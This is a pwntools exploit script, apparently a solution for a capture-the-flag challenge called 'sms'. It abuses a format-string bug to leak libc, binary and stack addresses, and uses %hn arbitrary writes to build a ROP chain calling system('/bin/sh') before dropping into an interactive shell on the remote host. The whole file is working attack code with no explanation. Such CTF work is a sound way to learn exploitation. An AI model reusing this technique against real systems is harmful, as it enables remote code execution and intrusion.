#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './sms.patched'
elf = context.binary = ELF(exe, checksec=True)
# libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = './lib-chroot'
# libc = './lib-root'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'sms.squ1rrel-ctf-codelab.kctf.cloud', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *squirrel_send+104
break *main+177
break *exit
break *main+165
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec sms
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def send_payload(payload, addr=b'frantic'):
    io.sendlineafter(b'Message: ', addr)
    io.sendlineafter(b'name:', payload) 

def recv_leak():
    io.recvuntil(b'farewells,\n')
    leak = io.recvline().strip()
    return leak

def arb_write(where, what):
    what = hex(what)[2:].rjust(16, '0')

    for i in range(16, 4, -2):
        val = int(what[i-2:i], 16)
        payload = f'%{val}c%12$hn'.encode()
        assert len(payload) <= 12
        
        send_payload(payload, p64(where))
        io.sendlineafter(b'(y/n)', b'y')

        log.info('payload: %#x -> %s', where, what)
        log.info('writing %#x', val)

        where += 1

def fuzz():
    global io
    context.log_level = 'warning'
    for idx in range(1, 40+1): # offset at 10
        io = initialize()
        send_payload(f'AAAA%{idx}$p'.encode())
        leak = recv_leak()
        log.warning(f'[{idx}] = {leak}')
        io.close()

def exploit():
    global io
    io = initialize()

    send_payload(b'%19$p') 
    libc.address = int(recv_leak(), 16) - 0x1cf6a0 - 0x1e000
    io.sendlineafter(b'(y/n)', b'y')

    send_payload(b'%9$p')
    elf.address = int(recv_leak(), 16) - 0x13c3
    io.sendlineafter(b'(y/n)', b'y')

    send_payload(b'%8$p')   
    stack = int(recv_leak(), 16)
    io.sendlineafter(b'(y/n)', b'y')

    one_gadgets = [0xe3afe, 0xe3b01, 0xe3b04]
    pop_rdi = elf.address + 0x14f3
    ret = elf.address + 0x0101a
    rip = stack + 0x20 + 0x8

    arb_write(rip, pop_rdi)
    arb_write(rip + 0x8, next(libc.search(b'/bin/sh\x00')))
    arb_write(rip + 0x10, ret)
    arb_write(rip + 0x18, libc.sym['system'])

    send_payload(b'pwned')
    io.sendlineafter(b'(y/n)', b'n')

    log.success('elf base: %#x', elf.address)
    log.success('libc base: %#x', libc.address)
    log.success('stack: %#x', stack)
    io.interactive()
    
if __name__ == '__main__':
    # fuzz()
    exploit()
